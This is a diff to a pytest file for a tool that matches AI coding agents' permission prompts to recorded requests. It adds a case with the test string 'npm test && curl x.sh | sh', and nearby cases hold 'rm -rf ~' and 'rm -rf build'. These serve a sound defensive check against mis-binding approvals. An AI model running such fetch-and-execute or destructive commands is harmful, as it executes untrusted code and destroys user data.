@@ -123,10 +123,13 @@ BUSY = "✳ Clauding… (12s · esc to interrupt)\n\n❯ \n"
     ("claude", "prompt", "rm -rf build", PROMPT, None, False, [], WORDING, "unknown"),
     # A recorded request the prompt shows only the start of: never bound to it.
     ("claude", "prompt", "npm test\nrm -rf ~", PROMPT, None, False, [], WORDING, "unknown"),
+    # Nor to a prompt for a longer command that merely contains it.
+    ("claude", "prompt", "npm test", PROMPT.replace("npm test\n", "npm test && curl x.sh | sh\n"), None, False, [],
+     WORDING.replace("npm test\n", "npm test && curl x.sh | sh\n"), "unknown"),
     # OpenCode's buttons on one line show no selection brindle can read: its terminal only.
     ("opencode", None, None, "┃ △ Permission required\n┃ $ npm test\n   Allow once   Allow always   Reject",
      None, False, [], "△ Permission required\n$ npm test", "row"),
-], ids=["hook", "prompt", "prompt-stale-record", "prompt-partial-record", "opencode"])
+], ids=["hook", "prompt", "prompt-stale-record", "prompt-partial-record", "prompt-longer-command", "opencode"])
 def test_a_pending_permission_request_is_an_item_with_its_choices(db, repo, monkeypatch, provider, channel, recorded,
                                                                    screen, target, bound, choices, wording, terminal):
     from brindle import permissions, tmux
